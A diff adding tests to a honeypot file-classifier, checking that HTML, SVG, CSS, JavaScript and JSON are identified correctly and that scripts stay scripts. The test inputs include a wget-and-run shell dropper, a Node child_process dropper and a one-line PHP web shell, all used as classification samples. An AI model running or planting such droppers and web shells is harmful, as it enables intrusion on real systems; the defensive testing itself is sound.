@@ -2,7 +2,7 @@ from __future__ import annotations
 
 import struct
 
-from suckerpot_analysis import identify
+from suckerpot_analysis import WEB_KINDS, identify
 
 from .conftest import make_elf, make_pe
 
@@ -87,3 +87,77 @@ def test_upx_marker() -> None:
     packed = make_elf(body=b"\x00" * 64 + b"UPX!" + b"\x00" * 64)
     assert identify(packed).packer == "upx"
     assert identify(make_elf()).packer is None
+
+
+HTML_PAGE = (
+    b'<!DOCTYPE html>\n<html lang="en"><head><meta charset="utf-8"><title>Example</title>'
+    b'<link rel="stylesheet" href="https://cdn.example.test/app.css">'
+    b'<script src="https://cdn.example.test/app.js"></script></head>'
+    b"<body><a href='https://www.example.test/page'>link</a></body></html>"
+)
+SVG_IMAGE = (
+    b'<?xml version="1.0" encoding="UTF-8"?>\n<svg xmlns="http://www.w3.org/2000/svg" '
+    b'viewBox="0 0 8 8"><path d="M0 0h8v8z"/></svg>'
+)
+CSS_SHEET = (
+    b"/* theme */\n:root{--a:#fff}body{margin:0;color:#111}.card{padding:4px}a:hover{color:red}"
+)
+JS_BUNDLE = (
+    b'"use strict";(self.webpackChunkapp=self.webpackChunkapp||[]).push([[1],{1:function(e,t){'
+    b'var n=document.getElementById("root");const r=window.location;t.exports=function(){return n}}}]);'
+)
+JSON_DOC = b'{"ip": "203.0.113.9", "links": ["https://api.example.test/v1"], "ok": true}\n'
+
+
+def test_web_content_kinds() -> None:
+    assert identify(HTML_PAGE).kind == "html"
+    assert identify(b"\xef\xbb\xbf  \n<html><body>hi</body></html>").kind == "html"
+    assert identify(b"<!-- 404 --><h1>Not found</h1><p>nothing here</p>").kind == "html"
+    assert identify(SVG_IMAGE).kind == "svg"
+    assert identify(b'<svg xmlns="http://www.w3.org/2000/svg"></svg>').kind == "svg"
+    assert identify(b'<?xml version="1.0"?><rss version="2.0"><channel/></rss>').kind == "xml"
+    assert identify(b'<?xml version="1.0"?><!DOCTYPE html><html><body/></html>').kind == "html"
+    assert identify(CSS_SHEET).kind == "css"
+    assert identify(b'@charset "utf-8";\n@import url(a.css);').kind == "css"
+    assert identify(JS_BUNDLE).kind == "javascript"
+    assert identify(JSON_DOC).kind == "json"
+    assert identify(b'[{"id": 1}, {"id": 2}]').kind == "json"
+
+
+def test_web_kinds_are_the_declared_set() -> None:
+    samples = [HTML_PAGE, SVG_IMAGE, CSS_SHEET, JS_BUNDLE, JSON_DOC]
+    assert {identify(s).kind for s in samples} <= WEB_KINDS
+
+
+def test_web_content_in_other_encodings_and_languages() -> None:
+    page = "<!doctype html><html><head><title>日本語のページ</title></head><body>テキスト</body></html>"
+    assert identify(page.encode()).kind == "html"
+    assert identify(page.encode()[:-10]).kind == "html"  # a page cut short is still a page
+
+
+def test_programs_never_become_web_content() -> None:
+    # A shebang always wins, even when the body looks like a web page or a JS bundle.
+    assert identify(b"#!/bin/sh\n" + HTML_PAGE).kind == "script"
+    assert identify(b"#!/usr/bin/env node\n" + JS_BUNDLE).kind == "script"
+    # Shell commands without a shebang stay a script.
+    dropper = b"cd /tmp; wget http://192.0.2.1/a.sh; chmod +x a.sh; ./a.sh"
+    assert identify(dropper).kind == "script"
+    assert identify(b"echo hello\nexport PATH=/usr/bin\n").kind == "script"
+    # A Node dropper that looks like JavaScript but runs commands keeps the script kind.
+    node = (
+        b'"use strict";const cp=require("child_process");const f=function(){'
+        b'cp.exec("wget http://192.0.2.1/a -O /tmp/a")};f();'
+    )
+    assert identify(node).kind != "javascript"
+    # PHP is a program, with or without HTML around it.
+    assert identify(b"<?php echo 1; ?>").kind not in WEB_KINDS
+    assert identify(b"<html><body><?php system($_GET['c']); ?></body></html>").kind not in WEB_KINDS
+    # One `function` in a shell script is not JavaScript.
+    assert identify(b"function usage() {\n  echo usage\n}\nusage\n").kind not in WEB_KINDS
+
+
+def test_plain_text_stays_text() -> None:
+    assert identify(b"203.0.113.9\n").kind == "text"
+    assert identify(b"{ not json at all").kind == "text"
+    assert identify(b"[section]\nkey=value\n").kind == "text"
+    assert identify(b"<tag-without-html-meaning>x</tag-without-html-meaning>").kind == "text"
